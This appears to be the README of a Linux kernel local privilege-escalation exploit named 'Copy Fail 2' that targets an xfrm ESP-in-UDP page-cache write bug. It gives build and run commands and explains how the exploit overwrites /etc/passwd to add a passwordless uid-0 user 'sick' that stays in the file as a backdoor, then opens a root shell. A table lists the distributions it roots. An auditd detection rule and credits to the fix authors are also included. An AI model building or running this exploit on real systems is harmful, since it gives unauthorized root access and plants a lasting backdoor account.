# Copy Fail 2: Electric Boogaloo

Unprivileged Linux LPE via xfrm ESP-in-UDP MSG_SPLICE_PAGES no-COW fast
path. Page-cache write into any readable file. Overwrites a nologin
line in `/etc/passwd` with `sick::0:0:...:/:/bin/bash` and `su`s into
it. Same class as Copy Fail (CVE-2026-31431), different subsystem.

Bug: https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4

## Build

    sudo apt install -y libssl-dev gcc
    gcc -O2 -Wall copyfail2.c -o copyfail2 -lcrypto
    gcc -O2 -Wall aa-rootns.c -o aa-rootns

## Run

    sh ./run.sh           # install + drop into root shell
    sh ./run.sh --clean   # revert /etc/passwd via the same primitive

Adds passwordless uid-0 user `sick` to `/etc/passwd`, then `exec su - sick`.
PAM `nullok` accepts the empty password silently — no input needed. The
`sick` line stays in `/etc/passwd` — re-run drops straight back into root.
State for `--clean` is stashed at `/var/tmp/.cf2.state`.

No sudo. esp4 / xfrm_user / xfrm_algo autoload via the userns netlink
path.

## Tested

| distro             | kernel               | result           |
|--------------------|----------------------|------------------|
| Ubuntu 22.04 LTS   | 5.15.0-176-generic   | not vulnerable*  |
| Ubuntu 24.04 LTS   | 6.8.0-110-generic    | root             |
| Debian 13          | 6.12.74              | root             |
| Arch               | 6.19.11-arch1-1      | root             |
| Fedora 43          | 6.19.14-200.fc43     | root             |
| Ubuntu 26.04 LTS   | 7.0.0-15-generic     | root             |
| RHEL 10            | 6.12.0-124.55.1.el10_1.x86_64 | root    |

*MSG_SPLICE_PAGES UDP support was added in 6.5, so 5.15 is below the
bug's reach.

## Auditd rule

~~~
sudo tee /etc/audit/rules.d/xfrm_netlink.rules >/dev/null <<'EOF'
-a always,exit -F arch=b64 -S socket -F a0=16 -F a2=6 -k xfrm_netlink_socket
-a always,exit -F arch=b32 -S socket -F a0=16 -F a2=6 -k xfrm_netlink_socket
EOF
sudo augenrules --load
~~~

## Credits

Hyunwoo Kim (imv4bel) and Kuan-Ting Chen reported, tested,
authored the upstream fix.

Steffen Klassert: IPsec maintainer, posted the fix to netdev/net.git.

Brad Spengler (@spendergrsec / grsecurity): called it copyfail-class
before anyone else read the commit.

Theori / Xint: original Copy Fail (CVE-2026-31431).
